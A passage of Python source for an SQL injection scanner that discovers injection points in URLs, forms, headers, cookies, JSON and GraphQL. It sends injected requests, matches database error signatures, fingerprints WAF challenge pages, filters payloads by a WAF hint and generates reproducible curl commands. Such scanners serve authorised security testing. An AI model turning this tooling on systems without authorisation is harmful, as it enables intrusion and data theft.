#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  HUGINN :: sqli.py — v3.2
#  SQL Injection Scanner — discovery + triage + confirmation-verified
# -----------------------------------------------------------------------------
#  v3.2 changes vs v3.1:
#    · WAF/challenge fingerprinting (CF/Akamai/Imperva/DataDome/Sucuri/AWS/F5)
#    · Control-plane header awareness (no body_diff promotion, deterministic
#      variation detection, strict confirmation required)
#    · Statistical baseline (3 samples, mean + σ) and σ-gated body_diff
#    · Body-diff requires ≥3 distinct payload IDs, each σ-significant
#    · SPA path-segment pre-flight (random-string probe)
#    · Per-point request budget, per-host 429/503 backoff
#    · Payload dedup per point
#    · Baseline snapshot stored in finding (fixes null baseline_status bug)
#    · Confirmed-only persistence by default (--save-unconfirmed overrides)
#    · Graceful Ctrl+C, partial summary still written
#    · Cleaner summary log ("candidates" vs "confirmed")
# =============================================================================

import re
import sys
import time
import json
import shlex
import signal
import hashlib
import statistics
import threading
from pathlib import Path
from urllib.parse import (urlparse, parse_qs, urlencode, urlunparse,
                          urljoin)
from concurrent.futures import ThreadPoolExecutor, as_completed

from huginn_utils import (
    log, section, load_json, save_json, load_payloads, send_request,
    safe_filename, C,
)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# =============================================================================
#  ERROR SIGNATURE BANK
# =============================================================================
ERROR_SIGNATURES = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
        r"MySqlClient\.", r"com\.mysql\.jdbc",
        r"Zend_Db_Adapter_Mysqli_Exception",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"You have an error in your SQL syntax",
        r"MySqlException", r"MySQLSyntaxErrorException",
        r"mysqli_", r"MariaDB server version",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR: parser: parse error at or near",
        r"pg_query\(\)", r"pg_exec\(\)",
        r"unterminated quoted string at or near",
    ],
    "mssql": [
        r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
        r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"macromedia\.jdbc\.sqlserver",
        r"com\.jnetdirect\.jsql",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"System\.Data\.SqlClient\.SqlException",
        r"mssql_query\(\)",
    ],
    "oracle": [
        r"\bORA-[0-9]{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_", r"Warning.*\Wora_", r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"ORA-00933", r"ORA-01756", r"ORA-00911",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]", r"SQLite error \d+:",
        r"sqlite3\.OperationalError:", r"sqlite3\.ProgrammingError:",
        r"SQLite3::SQLException", r"org\.sqlite\.JDBC",
    ],
    "sybase": [
        r"Sybase message", r"Sybase.*Server message",
        r"SybSQLException", r"com\.sybase\.jdbc",
    ],
    "db2": [
        r"DB2 SQL error", r"CLI Driver.*DB2", r"com\.ibm\.db2",
    ],
    "informix": [
        r"Informix ODBC Driver", r"com\.informix\.jdbc", r"ODBC Informix driver",
    ],
    "ingres": [
        r"Ingres SQLSTATE", r"Ingres\W.*Driver",
    ],
    "access": [
        r"JET Database Engine", r"Access Database Engine",
        r"Microsoft Access Driver", r"Syntax error.*in query expression",
    ],
    "generic": [
        r"SQL command not properly ended", r"syntax error at or near",
        r"Unclosed quotation mark", r"Unterminated string literal",
        r"invalid query", r"Dynamic SQL Error",
        r"Syntax error in string in query expression",
    ],
}

ALL_SIGNATURES = [(dbms, re.compile(sig, re.I))
                  for dbms, sigs in ERROR_SIGNATURES.items()
                  for sig in sigs]

GENERIC_500_HINTS = re.compile(
    r"(sql|query|database|odbc|jdbc|driver|syntax|column|table)", re.I
)

TIME_PAYLOADS = re.compile(
    r"(sleep\s*\(|pg_sleep\s*\(|waitfor\s+delay|benchmark\s*\(|dbms_lock\.sleep\s*\()",
    re.I,
)

# SQL-ish indicator used to promote body_diff on control-plane headers only
SQLISH_BODY_HINT = re.compile(
    r"(SQL|syntax|query|ODBC|JDBC|driver|column|table|ORA-|mysql|pg_|sqlite)",
    re.I,
)


# =============================================================================
#  WAF / CHALLENGE FINGERPRINTS
# =============================================================================
WAF_CHALLENGE_PATTERNS = [
    (re.compile(r"Just a moment\.\.\.", re.I),                      "cloudflare_challenge"),
    (re.compile(r"challenges\.cloudflare\.com", re.I),              "cloudflare_challenge"),
    (re.compile(r"cf-chl-", re.I),                                  "cloudflare_challenge"),
    (re.compile(r"__cf_chl_", re.I),                                "cloudflare_challenge"),
    (re.compile(r"Attention Required!\s*\|\s*Cloudflare", re.I),    "cloudflare_block"),
    (re.compile(r"Ray ID:\s*[0-9a-f]{6,}", re.I),                   "cloudflare_block"),
    (re.compile(r"Reference\s*#\d+\.\w+", re.I),                    "akamai_block"),
    (re.compile(r"Pardon Our Interruption", re.I),                  "akamai_block"),
    (re.compile(r"akamai bot manager", re.I),                       "akamai_block"),
    (re.compile(r"_Incapsula_Resource", re.I),                      "imperva_block"),
    (re.compile(r"Incapsula incident ID", re.I),                    "imperva_block"),
    (re.compile(r"DataDome", re.I),                                 "datadome_block"),
    (re.compile(r"datadome\.com", re.I),                            "datadome_block"),
    (re.compile(r"Sucuri WebSite Firewall", re.I),                  "sucuri_block"),
    (re.compile(r"CloudProxy - Access Denied", re.I),               "sucuri_block"),
    (re.compile(r"aws-waf-token", re.I),                            "aws_waf"),
    (re.compile(r"\bBIG-IP\b", re.I),                               "f5_big_ip"),
]

# Generic access-denied titles only count when paired with 403/503
GENERIC_BLOCK_TITLE = re.compile(
    r"<title>\s*(Access Denied|403 Forbidden|Forbidden|Request Blocked|"
    r"Not Acceptable|Service Unavailable)\s*</title>",
    re.I,
)


# =============================================================================
#  SKIP FILTERS
# =============================================================================
SKIP_EXTENSIONS = {
    ".js", ".mjs", ".css", ".map",
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".bmp",
    ".woff", ".woff2", ".ttf", ".otf", ".eot",
    ".mp3", ".mp4", ".webm", ".wav", ".ogg", ".ogv",
    ".pdf", ".zip", ".tar", ".gz", ".7z", ".rar",
    ".exe", ".dll", ".so", ".bin",
}

CDN_HOST_MARKERS = (
    "cdn.", ".cdn.", "static.", "assets.", "img.", "images.",
    "fonts.", "rbxcdn", "akamai", "cloudfront", "cloudflare",
    "fastly", "jsdelivr", "gstatic", "googleapis",
)

# Headers consumed by edge / load-balancer / WAF before the app sees them.
# body_diff alone must NEVER promote these.
CONTROL_PLANE_HEADERS = {
    "x-real-ip", "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
    "x-forwarded-server", "x-forwarded-port", "forwarded",
    "x-client-ip", "x-remote-addr", "x-remote-ip", "x-originating-ip",
    "x-cluster-client-ip", "x-cluster-ip", "true-client-ip",
    "cf-connecting-ip", "x-original-url", "x-rewrite-url", "x-original-host",
    "x-host", "x-forwarded-prefix", "origin", "referer",
}


# =============================================================================
#  JS / GRAPHQL DISCOVERY PATTERNS
# =============================================================================
JS_CALL_PATTERNS = [
    re.compile(r"""(?:fetch|axios(?:\.\w+)?|\$\.(?:ajax|get|post|put|delete|patch))\s*\(\s*["']([^"'\s]{2,300})["']"""),
    re.compile(r"""(?:url|endpoint|path|api|action|href)\s*[:=]\s*["']([^"'\s]{2,300})["']""", re.I),
]

JS_API_SHAPE = re.compile(
    r"""["']((?:https?://[^"'\s<>]+|/)[^"'\s<>]{0,200}?""" \
    r"""(?:api|graphql|v\d+|rest|json|search|query|user|item|product|order|""" \
    r"""filter|lookup|fetch|detail)[^"'\s<>]{0,200}?)["']""",
    re.I,
)

GRAPHQL_PATH = re.compile(r"graphql", re.I)


# =============================================================================
#  HELPERS
# =============================================================================
def _url_extension(url):
    path = urlparse(url).path
    if "." not in path.rsplit("/", 1)[-1]:
        return ""
    return "." + path.rsplit(".", 1)[-1].lower()


def _is_static_url(url):
    ext = _url_extension(url)
    if ext in SKIP_EXTENSIONS:
        return True
    host = urlparse(url).netloc.lower()
    for marker in CDN_HOST_MARKERS:
        if marker in host:
            return True
    return False


def _fingerprint_response(resp):
    """Length + stability hash with volatile content normalised out."""
    if resp is None:
        return {"hash": None, "length": 0, "status": None}
    body = resp.text or ""
    stable = body
    stable = re.sub(r"\b[a-f0-9]{24,}\b", "__HEX__", stable)
    stable = re.sub(r"\b[A-Za-z0-9+/=]{40,}\b", "__B64__", stable)
    stable = re.sub(r"\b1[0-9]{9,12}\b", "__TS__", stable)
    stable = re.sub(r'nonce["\']?\s*[:=]\s*["\']([^"\']{4,})["\']',
                    'nonce="__NONCE__"', stable)
    stable = re.sub(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']{4,})["\']',
                    'csrf="__CSRF__"', stable, flags=re.I)
    stable = re.sub(r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']',
                    'name="_token" value="__TOKEN__"', stable, flags=re.I)
    return {
        "hash": hashlib.sha256(
            stable.encode("utf-8", errors="ignore")
        ).hexdigest()[:16],
        "length": len(body),
        "status": resp.status_code,
    }


def _fingerprints_differ(a, b, min_len_delta=200):
    if a["hash"] is None or b["hash"] is None:
        return False
    if a["hash"] == b["hash"]:
        return False
    if abs(a["length"] - b["length"]) >= min_len_delta:
        return True
    if a["hash"] != b["hash"] and abs(a["length"] - b["length"]) > 20:
        return True
    return False


def _detect_waf_challenge(resp):
    """Return WAF tag string or None. Non-fatal."""
    if resp is None:
        return None
    body = resp.text or ""
    if not body:
        return None
    for pat, tag in WAF_CHALLENGE_PATTERNS:
        if pat.search(body):
            return tag
    if resp.status_code in (403, 503) and GENERIC_BLOCK_TITLE.search(body):
        return "generic_block"
    return None


def _make_false_variant(payload):
    patterns = [
        (re.compile(r"'\s*1\s*'\s*=\s*'1", re.I), "'1'='2"),
        (re.compile(r"'\s*1\s*'\s*=\s*1", re.I),  "'1'=2"),
        (re.compile(r"\b1\s*=\s*1\b"),             "1=2"),
        (re.compile(r"\btrue\b", re.I),            "false"),
    ]
    for pat, repl in patterns:
        new = pat.sub(repl, payload, count=1)
        if new != payload:
            return new
    return None


def _rand_token(n=8):
    import random, string
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# =============================================================================
#  INJECTION POINT MODEL
# =============================================================================
class InjectionPoint:
    __slots__ = ("url", "method", "location", "name", "value",
                 "json_path", "extra_headers", "form_data", "json_body",
                 "content_type",
                 # baseline state
                 "baseline_resp", "baseline_fp",
                 "baseline_snapshot",         # dict for finding
                 "baseline_samples",          # list of fps
                 "baseline_len_mean", "baseline_len_stddev",
                 "timing_baseline", "timing_stddev",
                 # classification
                 "is_control_plane", "is_path_segment",
                 # per-point state
                 "waf_tag", "deterministic_variation", "spa_route",
                 "skipped_reason")

    def __init__(self, url, method, location, name, value,
                 json_path=None, extra_headers=None,
                 form_data=None, json_body=None, content_type=None):
        self.url = url
        self.method = method
        self.location = location
        self.name = name
        self.value = value
        self.json_path = json_path
        self.extra_headers = extra_headers or {}
        self.form_data = form_data or {}
        self.json_body = json_body
        self.content_type = content_type

        self.baseline_resp = None
        self.baseline_fp = None
        self.baseline_snapshot = None
        self.baseline_samples = []
        self.baseline_len_mean = None
        self.baseline_len_stddev = None
        self.timing_baseline = None
        self.timing_stddev = None

        self.is_control_plane = False
        self.is_path_segment = (location == "path")

        self.waf_tag = None
        self.deterministic_variation = False
        self.spa_route = False
        self.skipped_reason = None

    def key(self):
        return (self.url, self.method, self.location, self.name)

    def __repr__(self):
        cp = " [CP]" if self.is_control_plane else ""
        return f"<IP {self.location}:{self.name}{cp} @ {self.method} {self.url}>"


# =============================================================================
#  INJECTION POINT EXTRACTION
# =============================================================================
def _extract_query_params(page):
    url = page["url"]
    parsed = urlparse(url)
    if not parsed.query:
        return []
    qs = parse_qs(parsed.query, keep_blank_values=True)
    return [InjectionPoint(url, "GET", "query", k, v[0]) for k, v in qs.items()]


def _extract_path_segments(page):
    parsed = urlparse(page["url"])
    segs = [s for s in parsed.path.split("/") if s]
    if not segs:
        return []
    out = []
    for i, seg in enumerate(segs):
        if _is_static_url(f"http://x/{seg}"):
            continue
        out.append(InjectionPoint(
            page["url"], "GET", "path", f"segment[{i}]", seg,
            extra_headers={"_segment_index": str(i)},
        ))
    return out


def _extract_forms(page):
    if BeautifulSoup is None:
        return []
    html = page.get("content") or ""
    if not html:
        return []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return []
    points = []
    for form in soup.find_all("form"):
        action = form.get("action") or page["url"]
        action_url = urljoin(page["url"], action)
        method = (form.get("method") or "GET").upper()
        ct = (form.get("enctype") or "application/x-www-form-urlencoded").lower()
        data = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "").lower()
            if itype in ("submit", "button", "reset", "file", "image"):
                continue
            data[name] = inp.get("value") or ""
        for name, value in data.items():
            points.append(InjectionPoint(
                action_url, method, "body_form", name, value,
                form_data=dict(data), content_type=ct,
            ))
    return points


def _extract_headers(page):
    headers = [
        "Referer", "User-Agent", "X-Forwarded-For", "X-Forwarded-Host",
        "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Client-IP", "Forwarded", "Origin", "X-Original-URL",
    ]
    points = []
    for h in headers:
        ip = InjectionPoint(page["url"], "GET", "header", h, "")
        if h.lower() in CONTROL_PLANE_HEADERS:
            ip.is_control_plane = True
        points.append(ip)
    return points


def _extract_cookies(page):
    headers = page.get("headers") or {}
    sc = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
    if not sc:
        return []
    out = []
    for chunk in sc.split(","):
        m = re.match(r"\s*([^=]+)=([^;]+)", chunk)
        if m:
            out.append(InjectionPoint(
                page["url"], "GET", "cookie",
                m.group(1).strip(), m.group(2).strip(),
            ))
    return out


def _extract_json_body(page):
    ct = (page.get("content_type") or "").lower()
    content = page.get("content") or ""
    if "json" not in ct and not content.lstrip().startswith(("{", "[")):
        return []
    try:
        body = json.loads(content)
    except Exception:
        return []
    points = []

    def walk(obj, path="$"):
        if isinstance(obj, dict):
            for k, v in obj.items():
                walk(v, f"{path}.{k}")
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                walk(v, f"{path}[{i}]")
        else:
            points.append(InjectionPoint(
                page["url"], "POST", "body_json", path, str(obj),
                json_path=path, json_body=body,
                content_type="application/json",
            ))

    walk(body)
    return points


# --------------------------------------------------------------------------- #
#  JS / HTML endpoint discovery
# --------------------------------------------------------------------------- #
def _discover_js_endpoints(pages):
    found = {}
    for page in pages:
        content = page.get("content") or ""
        if not content or len(content) < 20:
            continue
        base = page.get("url") or ""
        for pat in JS_CALL_PATTERNS + [JS_API_SHAPE]:
            for m in pat.finditer(content):
                raw = m.group(1)
                if not raw or raw.startswith(("data:", "javascript:", "mailto:")):
                    continue
                try:
                    full = urljoin(base, raw)
                except Exception:
                    continue
                if _is_static_url(full):
                    continue
                p = urlparse(full)
                if not p.netloc or not p.path:
                    continue
                key = urlunparse(p._replace(fragment=""))
                found[key] = True
    return list(found.keys())


def _points_from_discovered_urls(urls):
    points = []
    for u in urls:
        parsed = urlparse(u)
        if parsed.query:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in qs.items():
                points.append(InjectionPoint(u, "GET", "query", k, v[0]))
    return points


# --------------------------------------------------------------------------- #
#  GraphQL
# --------------------------------------------------------------------------- #
def _graphql_probe_urls(pages, discovered_urls):
    cands = set()
    for u in discovered_urls:
        if GRAPHQL_PATH.search(u):
            cands.add(u)
    for page in pages:
        u = page.get("url") or ""
        if GRAPHQL_PATH.search(u):
            cands.add(u)
        p = urlparse(u)
        if p.scheme and p.netloc:
            for path in ("/graphql", "/api/graphql", "/v1/graphql",
                         "/query", "/api/query"):
                cands.add(f"{p.scheme}://{p.netloc}{path}")
    return list(cands)


def _is_graphql_endpoint(url, static_headers, timeout):
    body = json.dumps({"query": "{__typename}"})
    headers = dict(static_headers)
    headers["Content-Type"] = "application/json"
    headers["Accept"] = "application/json"
    try:
        r = send_request(url, method="POST", headers=headers,
                         data=body, timeout=timeout, allow_redirects=False)
    except Exception:
        return False
    if r is None:
        return False
    if _detect_waf_challenge(r):
        return False
    txt = (r.text or "").strip()
    if not txt:
        return False
    try:
        j = json.loads(txt)
    except Exception:
        return False
    return isinstance(j, dict) and ("data" in j or "errors" in j)


def _graphql_injection_points(url):
    var_names = ("id", "q", "query", "search", "filter", "value", "input")
    points = []
    for vn in var_names:
        body = {
            "query": "query Q($%s: String) { __typename }" % vn,
            "variables": {vn: "1"},
        }
        points.append(InjectionPoint(
            url, "POST", "body_json", f"$.variables.{vn}", "1",
            json_path=f"$.variables.{vn}", json_body=body,
            content_type="application/json",
        ))
    return points


# --------------------------------------------------------------------------- #
#  Top-level extraction
# --------------------------------------------------------------------------- #
def extract_injection_points(pages):
    points, seen = [], set()

    for page in pages:
        url = page.get("url", "")
        if _is_static_url(url):
            continue

        cands = []
        cands.extend(_extract_query_params(page))
        cands.extend(_extract_path_segments(page))
        cands.extend(_extract_forms(page))
        cands.extend(_extract_headers(page))
        cands.extend(_extract_cookies(page))
        cands.extend(_extract_json_body(page))

        for ip in cands:
            k = ip.key()
            if k in seen:
                continue
            seen.add(k)
            points.append(ip)

    discovered = _discover_js_endpoints(pages)
    for ip in _points_from_discovered_urls(discovered):
        k = ip.key()
        if k in seen:
            continue
        seen.add(k)
        points.append(ip)

    return points, discovered


# =============================================================================
#  REQUEST BUILDER + cURL GENERATOR
# =============================================================================
def _set_json_path(obj, path, value):
    tokens = re.findall(r"\.([^\.\[\]]+)|\[(\d+)\]", path)
    if not tokens:
        return
    cur = obj
    for i, (name, idx) in enumerate(tokens):
        key = name if name else int(idx)
        if i == len(tokens) - 1:
            try:
                cur[key] = value
            except Exception:
                pass
            return
        try:
            cur = cur[key]
        except Exception:
            return


def build_request(ip, payload, timeout=12, extra_headers=None,
                  allow_redirects=False):
    headers = dict(ip.extra_headers)
    if extra_headers:
        headers.update(extra_headers)
    url = ip.url
    method = ip.method
    data = None

    if ip.location == "query":
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))

    elif ip.location == "path":
        idx = int(headers.pop("_segment_index", "0"))
        p = urlparse(url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))

    elif ip.location == "body_form":
        body = dict(ip.form_data)
        body[ip.name] = payload
        data = body
        headers["Content-Type"] = ip.content_type or "application/x-www-form-urlencoded"

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        data = json.dumps(body)
        headers["Content-Type"] = "application/json"

    elif ip.location == "cookie":
        existing = headers.get("Cookie", "")
        pair = f"{ip.name}={payload}"
        headers["Cookie"] = f"{existing}; {pair}".strip("; ") if existing else pair

    elif ip.location == "header":
        headers[ip.name] = payload

    return send_request(
        url, method=method, headers=headers,
        timeout=timeout, allow_redirects=allow_redirects, data=data,
    )


def build_curl(ip, payload, timeout=15, static_headers=None):
    parts = ["curl", "-sk", "--max-time", str(timeout), "-i"]
    static_headers = static_headers or {}

    # Inject static headers (Cookie, UA) so the command reproduces exactly.
    merged_headers = dict(static_headers)
    merged_headers.pop("Content-Type", None)  # set below per location

    if ip.location == "query":
        p = urlparse(ip.url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))
        for k, v in merged_headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.append(shlex.quote(url))

    elif ip.location == "path":
        idx = int((ip.extra_headers or {}).get("_segment_index", "0"))
        p = urlparse(ip.url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))
        for k, v in merged_headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.append(shlex.quote(url))

    elif ip.location == "body_form":
        body = dict(ip.form_data)
        body[ip.name] = payload
        if ip.method == "GET":
            p = urlparse(ip.url)
            url = urlunparse(p._replace(query=urlencode(body, doseq=True)))
            for k, v in merged_headers.items():
                parts.extend(["-H", shlex.quote(f"{k}: {v}")])
            parts.append(shlex.quote(url))
        else:
            parts.extend(["-X", "POST"])
            for k, v in merged_headers.items():
                parts.extend(["-H", shlex.quote(f"{k}: {v}")])
            for k, v in body.items():
                parts.extend(["--data-urlencode", shlex.quote(f"{k}={v}")])
            parts.append(shlex.quote(ip.url))

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        parts.extend(["-X", "POST"])
        for k, v in merged_headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.extend(["-H", shlex.quote("Content-Type: application/json")])
        parts.extend(["--data-raw", shlex.quote(json.dumps(body))])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "cookie":
        cookie_parts = []
        for k, v in merged_headers.items():
            if k.lower() == "cookie":
                cookie_parts.append(v)
        cookie_parts.append(f"{ip.name}={payload}")
        for k, v in merged_headers.items():
            if k.lower() != "cookie":
                parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.extend(["-H", shlex.quote(f"Cookie: {'; '.join(cookie_parts)}")])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "header":
        for k, v in merged_headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.extend(["-H", shlex.quote(f"{ip.name}: {payload}")])
        parts.append(shlex.quote(ip.url))

    else:
        for k, v in merged_headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        parts.append(shlex.quote(ip.url))

    return " ".join(parts)


# =============================================================================
#  DETECTION PRIMITIVES
# =============================================================================
def _match_error_signature(body, baseline_body=""):
    if not body:
        return None, None
    baseline_low = baseline_body.lower() if baseline_body else ""
    for dbms, regex in ALL_SIGNATURES:
        m = regex.search(body)
        if m:
            matched = m.group(0)[:120].lower()
            if matched in baseline_low:
                continue
            start = max(0, m.start() - 80)
            end = min(len(body), m.end() + 200)
            return dbms, body[start:end]
    return None, None


def _severity_for(confidence):
    return {"high": "high", "medium": "medium", "low": "low"}.get(confidence, "low")


# =============================================================================
#  SCANNER
# =============================================================================
class SQLiScanner:

    def __init__(self,
                 program_dir,
                 sites_root=None,
                 max_workers=4,
                 delay=0.25,
                 timeout=12,
                 waf_hint=None,
                 dbms_hint=None,
                 time_threshold=4.0,
                 confirm_timing=True,
                 cookie=None,
                 user_agent=None,
                 point_budget=1200,
                 global_budget=None,
                 save_unconfirmed=False,
                 abort_on_waf=True):
        self.program_dir = Path(program_dir)
        self.sites_root = Path(sites_root or (self.program_dir / "sites"))
        self.findings_root = self.program_dir / "findings" / "sqli"
        self.findings_root.mkdir(parents=True, exist_ok=True)

        self.max_workers = max_workers
        self.delay = delay
        self.timeout = timeout
        self.waf_hint = waf_hint
        self.dbms_hint = dbms_hint
        self.time_threshold = time_threshold
        self.confirm_timing = confirm_timing
        self.point_budget = point_budget
        self.global_budget = global_budget
        self.save_unconfirmed = save_unconfirmed
        self.abort_on_waf = abort_on_waf

        self.static_headers = {}
        if cookie:
            self.static_headers["Cookie"] = cookie
        if user_agent:
            self.static_headers["User-Agent"] = user_agent

        self.seen_signatures = set()
        self._payload_cache = None
        self._throttle_last = {}
        self._host_backoff = {}
        self._throttle_lock = threading.Lock()
        self._save_lock = threading.Lock()
        self._counter_lock = threading.Lock()
        self._request_count = 0
        self._shutdown = threading.Event()
        self._host_waf = {}    # host -> waf_tag

    # ------------------------------------------------------------------ #
    def _shutdown_requested(self):
        return self._shutdown.is_set()

    def request_shutdown(self):
        self._shutdown.set()

    def _bump_counter(self):
        with self._counter_lock:
            self._request_count += 1
            if self.global_budget and self._request_count > self.global_budget:
                if not self._shutdown.is_set():
                    log(f"global request budget exhausted "
                        f"({self.global_budget}); signalling shutdown",
                        "warn", "SQLI")
                self._shutdown.set()

    def _throttle(self, url):
        host = urlparse(url).netloc.lower()
        with self._throttle_lock:
            now = time.time()
            last = self._throttle_last.get(host, 0.0)
            backoff = self._host_backoff.get(host, 0.0)
            wait = max(self.delay - (now - last), backoff)
            if wait > 0:
                time.sleep(wait)
                now = time.time()
            self._throttle_last[host] = now

    def _note_throttle_signal(self, url, resp):
        """Backoff on 429/503 with Retry-After if present."""
        if resp is None:
            return
        if resp.status_code not in (429, 503):
            return
        host = urlparse(url).netloc.lower()
        retry_after = None
        try:
            ra = resp.headers.get("Retry-After") or resp.headers.get("retry-after")
            if ra:
                retry_after = float(ra)
        except Exception:
            retry_after = None
        with self._throttle_lock:
            self._host_backoff[host] = min(30.0, retry_after or 5.0)

    # ------------------------------------------------------------------ #
    def load_and_filter_payloads(self):
        data = load_payloads("sqli")
        raw = data.get("payloads", [])
        filtered, seen_payloads = [], set()
        for entry in raw:
            if isinstance(entry, str):
                if entry in seen_payloads:
                    continue
                seen_payloads.add(entry)
                filtered.append({
                    "id": "raw", "name": "raw", "category": "unknown",
                    "dbms": "generic", "waf": None,
                    "payload": entry, "tags": [], "description": "",
                })
                continue
            entry_waf = entry.get("waf")
            if self.waf_hint and entry_waf:
                if self.waf_hint.lower() not in entry_waf.lower():
                    continue
            entry_dbms = (entry.get("dbms") or "all").lower()
            if self.dbms_hint and entry_dbms not in ("all", "generic"):
                if self.dbms_hint.lower() not in entry_dbms:
                    continue
            p = entry.get("payload")
            if not p or p in seen_payloads:
                continue
            seen_payloads.add(p)
            filtered.append(entry)
        self._payload_cache = filtered
        return filtered

    # ------------------------------------------------------------------ #
    #  Baseline
    # ------------------------------------------------------------------ #
    def capture_baseline(self, ip):
        # Primary baseline = current value (may be empty for headers)
        try:
            ip.baseline_resp = build_request(
                ip, ip.value, timeout=self.timeout,
                extra_headers=self.static_headers)
            self._bump_counter()
            self._note_throttle_signal(ip.url, ip.baseline_resp)
        except Exception:
            ip.baseline_resp = None

        ip.baseline_fp = _fingerprint_response(ip.baseline_resp)

        # Snapshot for finding — never rely on mutating response objects later
        if ip.baseline_resp is not None:
            ip.baseline_snapshot = {
                "status": ip.baseline_resp.status_code,
                "length": len(ip.baseline_resp.text or ""),
                "hash": ip.baseline_fp["hash"],
            }
        else:
            ip.baseline_snapshot = {"status": None, "length": None, "hash": None}

        # WAF short-circuit on baseline
        ip.waf_tag = _detect_waf_challenge(ip.baseline_resp)
        if ip.waf_tag:
            log(f"  skip (WAF challenge on baseline: {ip.waf_tag}): "
                f"{ip.url} [{ip.name}]", "info", "SQLI")
            ip.skipped_reason = f"waf:{ip.waf_tag}"
            return ip.baseline_resp

        # Statistical baseline: 3 benign samples
        samples_fps = []
        timing_samples = []
        for i in range(3):
            self._throttle(ip.url)
            # Vary benign value slightly so cache doesn't collapse the sample
            benign = ip.value if i == 0 else f"{ip.value or ''}b{i}"
            t0 = time.time()
            try:
                r = build_request(ip, benign, timeout=self.timeout,
                                  extra_headers=self.static_headers)
                self._bump_counter()
                self._note_throttle_signal(ip.url, r)
            except Exception:
                r = None
            elapsed = time.time() - t0
            timing_samples.append(elapsed)
            if r is not None:
                samples_fps.append(_fingerprint_response(r))

        ip.baseline_samples = samples_fps
        if samples_fps:
            lengths = [s["length"] for s in samples_fps]
            ip.baseline_len_mean = statistics.mean(lengths)
            ip.baseline_len_stddev = (statistics.stdev(lengths)
                                      if len(lengths) > 1 else 0.0)

        if timing_samples:
            ip.timing_baseline = statistics.median(timing_samples)
            ip.timing_stddev = (statistics.stdev(timing_samples)
                                if len(timing_samples) > 1 else 0.0)
        else:
            ip.timing_baseline = 0.5
            ip.timing_stddev = 0.2

        return ip.baseline_resp

    # ================================================================== #
    #  TRIAGE
    # ================================================================== #
    def _triage_point(self, ip):
        if ip.skipped_reason:
            return False, {"skip": ip.skipped_reason}
        if ip.baseline_resp is None:
            return False, {"dead": True}

        hints = {}
        baseline_body = ip.baseline_resp.text or ""

        # --- Path-segment SPA pre-flight ------------------------------
        if ip.is_path_segment:
            probe = _rand_token(len(ip.value) or 6)
            self._throttle(ip.url)
            try:
                r = build_request(ip, probe, timeout=self.timeout,
                                  extra_headers=self.static_headers)
                self._bump_counter()
            except Exception:
                r = None
            if r is not None:
                fp = _fingerprint_response(r)
                if not _fingerprints_differ(fp, ip.baseline_fp, min_len_delta=0):
                    ip.spa_route = True
                    ip.skipped_reason = "spa_route"
                    log(f"  skip (SPA path segment): {ip.url} [{ip.name}]",
                        "info", "SQLI")
                    return False, {"skip": "spa_route"}

        # --- Control-plane header deterministic variation -------------
        if ip.is_control_plane:
            ctrl_a = _rand_token(10)
            ctrl_b = _rand_token(10)
            self._throttle(ip.url)
            try:
                ra = build_request(ip, ctrl_a, timeout=self.timeout,
                                   extra_headers=self.static_headers)
                self._bump_counter()
            except Exception:
                ra = None
            time.sleep(0.15)
            self._throttle(ip.url)
            try:
